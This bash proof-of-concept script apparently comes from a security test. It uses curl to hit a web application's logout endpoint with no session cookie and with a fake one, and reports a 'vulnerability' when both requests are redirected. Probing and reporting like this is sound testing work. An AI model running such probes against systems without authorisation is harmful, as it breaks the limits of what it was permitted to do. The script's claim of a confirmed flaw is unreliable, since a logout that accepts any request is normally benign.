#!/bin/bash

# POC: Missing Authentication Validation on Logout Endpoint
# This script demonstrates that unauthenticated users can access the logout endpoint
# without any valid session cookie, and receive the same 302 redirect response

TARGET="${1:-http://localhost}"
LOGOUT_ENDPOINT="/logout"

echo "[*] Testing Missing Authentication Validation on Logout Endpoint"
echo "[*] Target: $TARGET$LOGOUT_ENDPOINT"
echo ""

# Test 1: Access logout without any session cookie
echo "[TEST 1] Accessing logout endpoint WITHOUT any session cookie"
echo "Command: curl -i -X GET $TARGET$LOGOUT_ENDPOINT"
RESPONSE_NO_SESSION=$(curl -i -X GET "$TARGET$LOGOUT_ENDPOINT" 2>/dev/null)
STATUS_NO_SESSION=$(echo "$RESPONSE_NO_SESSION" | head -1)
HEADERS_NO_SESSION=$(echo "$RESPONSE_NO_SESSION" | grep -i "location")
echo "Response Status: $STATUS_NO_SESSION"
echo "Location Header: $HEADERS_NO_SESSION"
echo ""

# Test 2: Access logout with invalid/random session
echo "[TEST 2] Accessing logout endpoint WITH invalid session cookie"
echo "Command: curl -i -X GET -H 'Cookie: session=invalid_random_token_12345' $TARGET$LOGOUT_ENDPOINT"
RESPONSE_INVALID_SESSION=$(curl -i -X GET -H "Cookie: session=invalid_random_token_12345" "$TARGET$LOGOUT_ENDPOINT" 2>/dev/null)
STATUS_INVALID_SESSION=$(echo "$RESPONSE_INVALID_SESSION" | head -1)
HEADERS_INVALID_SESSION=$(echo "$RESPONSE_INVALID_SESSION" | grep -i "location")
echo "Response Status: $STATUS_INVALID_SESSION"
echo "Location Header: $HEADERS_INVALID_SESSION"
echo ""

# Test 3: Verify both responses are identical (no authentication check)
echo "[TEST 3] Comparing responses - Vulnerability Check"
echo "Both requests receive 302 redirect despite authentication state?"
if echo "$RESPONSE_NO_SESSION" | grep -q "302\|301\|307"; then
    echo "[✓] VULNERABLE: Logout accepted without session (302 redirect)"
    
    if echo "$RESPONSE_INVALID_SESSION" | grep -q "302\|301\|307"; then
        echo "[✓] VULNERABLE: Logout accepted with invalid session (302 redirect)"
        echo "[!] VULNERABILITY CONFIRMED: No authentication validation on logout"
        
        # Check if Location headers are similar
        if [ "$HEADERS_NO_SESSION" == "$HEADERS_INVALID_SESSION" ]; then
            echo "[!] Same redirect response regardless of session validity"
            exit 0
        fi
    fi
fi

echo "[✗] Could not confirm vulnerability"
exit 1